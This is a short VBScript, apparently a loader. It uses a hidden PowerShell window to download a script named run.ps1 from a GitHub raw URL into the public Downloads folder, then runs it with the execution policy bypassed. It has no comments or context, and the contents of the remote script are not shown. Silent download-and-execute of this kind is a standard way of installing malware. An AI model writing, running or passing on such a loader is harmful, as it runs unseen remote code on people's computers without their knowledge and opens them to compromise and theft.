Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/GPU/refs/heads/main/run.ps1 -OutFile C:\Users\Public\Downloads\run.ps1", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\run.ps1", 0, True
